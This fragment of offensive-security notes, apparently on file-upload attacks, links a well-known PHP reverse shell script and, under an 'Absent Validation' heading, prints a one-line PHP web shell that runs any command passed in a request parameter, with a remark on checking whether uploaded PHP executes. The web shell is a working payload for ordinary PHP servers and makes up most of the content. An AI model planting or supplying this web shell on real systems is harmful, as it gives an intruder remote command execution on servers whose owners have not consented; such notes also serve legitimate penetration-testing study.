* php reverse shell
    * https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
# <span style=color:red>Absent Validation</span>
* If the page could not run PHP payload, we would see our source code printed on the page
```php
//webshell
<?php system($_REQUEST['cmd']);?>
```

---
